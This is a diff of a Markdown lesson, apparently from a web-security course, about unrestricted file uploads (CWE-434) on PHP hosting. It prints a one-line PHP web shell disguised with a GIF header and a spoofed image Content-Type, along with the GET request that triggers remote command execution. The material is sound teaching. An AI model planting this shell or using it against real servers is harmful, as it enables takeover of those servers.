@@ -29,17 +29,20 @@ Each case has a PNG in [`illustrations/`](illustrations/). Case **#1** uses **tw
    - **Change the shop** (defacement, scam page, malware for visitors)
    - **Pivot** — use your server to attack others (spam, bots, mining)
 
-**Technical body (example):**
+**Technical slide:** [`hist-01-php-shell-technical.png`](illustrations/hist-01-php-shell-technical.png) — English, full POST multipart + saved path + GET.
 
-```
-Content-Disposition: form-data; name="file"; filename="image.php"
-Content-Type: image/jpeg
+**Two Content-Types (both appear “valid” syntactically):**
 
-GIF89a;
-<?php system($_GET['cmd']); ?>
-```
+| Header | Value | Role |
+|--------|--------|------|
+| Request | `multipart/form-data; boundary=…` | Correct for file upload |
+| Part | `image/jpeg` | **Spoofed** — attacker lies; backend must not trust it |
 
-Then `GET /uploads/image.php?cmd=cat%20secret` → `system()` → exfiltration / backdoor.
+**Body of the file part:** optional `GIF89a;` + `<?php system($_GET['cmd']); ?>`
+
+**Saved as (weak backend):** `uploads/image.php` from `filename="image.php"` in Content-Disposition.
+
+**Trigger:** `GET /uploads/image.php?cmd=whoami` → `mod_php` → RCE.
 
 **Real history (important):** This is **not** a single newspaper headline like TimThumb 2011 — it is the **default failure mode** of **PHP + Apache shared hosting** from the **2000s–2010s** until today on misconfigured sites. Pentesters and criminals repeatedly found: avatar/CV/gallery upload → file saved under the web root → **mod_php runs `.php`**. [PortSwigger Web Security Academy](https://portswigger.net/web-security/file-upload) built its **RCE upload labs** on this exact chain (e.g. reading `/home/carlos/secret`). Classified under **CWE-434** / OWASP “Unrestricted File Upload”. Your **Node shop lab** intentionally does **not** execute uploads — this case explains **server-side** impact when the stack **does** run PHP.
 
